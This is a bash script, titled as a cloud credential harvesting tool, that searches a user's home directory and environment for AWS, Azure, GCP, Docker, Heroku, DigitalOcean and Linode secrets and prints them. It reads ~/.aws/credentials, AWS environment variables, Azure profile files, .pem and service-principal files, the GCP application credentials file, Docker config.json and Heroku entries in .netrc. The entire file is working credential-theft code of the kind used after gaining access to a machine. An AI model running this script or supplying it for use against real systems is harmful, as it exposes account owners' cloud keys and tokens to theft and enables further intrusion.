#!/bin/bash
# cloud-creds.sh - Cloud credential harvesting
# Usage: ./cloud-creds.sh [aws|azure|gcp|all]

MODE=${1:-menu}

case $MODE in
    aws)
        echo "=== AWS Credentials ==="
        echo "[*] Checking for AWS keys..."
        find ~ -name "*.aws*" -o -name "credentials" 2>/dev/null | xargs grep -l "AKIA" 2>/dev/null
        echo "[*] AWS CLI config..."
        cat ~/.aws/credentials 2>/dev/null || echo "No AWS config"
        echo "[*] Environment vars..."
        env | grep -i aws 2>/dev/null
        ;;
    azure)
        echo "=== Azure Credentials ==="
        echo "[*] Azure CLI..."
        cat ~/.azure/azureProfile.json 2>/dev/null || echo "No Azure config"
        echo "[*] Azure tokens..."
        find ~/.azure -name "*.json" 2>/dev/null | head -5
        echo "[*] Service principal files..."
        find ~ -name "*.pem" -o -name "sp*.json" 2>/dev/null | head -10
        ;;
    gcp)
        echo "=== GCP Credentials ==="
        echo "[*] GCP key file..."
        find ~ -name "*.json" -path "*gcp*" -o -path "*google*" 2>/dev/null | head -10
        echo "[*] Application credentials..."
        echo $GOOGLE_APPLICATION_CREDENTIALS
        cat $GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null | head -20
        ;;
    docker)
        echo "=== Docker Hub/Registry ==="
        cat ~/.docker/config.json 2>/dev/null || echo "No Docker config"
        ;;
    heroku)
        echo "=== Heroku API ==="
        find ~ -name ".netrc" 2>/dev/null | xargs grep heroku 2>/dev/null
        ;;
    do)
        echo "=== DigitalOcean ==="
        find ~ -name "*.do" -o -path "*digitalocean*" 2>/dev/null
        ;;
    linode)
        echo "=== Linode ==="
        find ~ -name "*linode*" 2>/dev/null
        ;;
    all)
        echo "=== All Cloud Credentials ==="
        $0 aws
        $0 azure
        $0 gcp
        $0 docker
        $0 heroku
        ;;
    menu|*)
        echo "=== Cloud Credentials ==="
        echo "1) AWS"
        echo "2) Azure"
        echo "3) GCP"
        echo "4) Docker"
        echo "5) Heroku"
        echo "6) DigitalOcean"
        echo "7) Linode"
        echo "8) Scan All"
        read -p "Choice: " choice
        case $choice in
            1) $0 aws ;;
            2) $0 azure ;;
            3) $0 gcp ;;
            4) $0 docker ;;
            5) $0 heroku ;;
            6) $0 do ;;
            7) $0 linode ;;
            8) $0 all ;;
        esac
        ;;
esac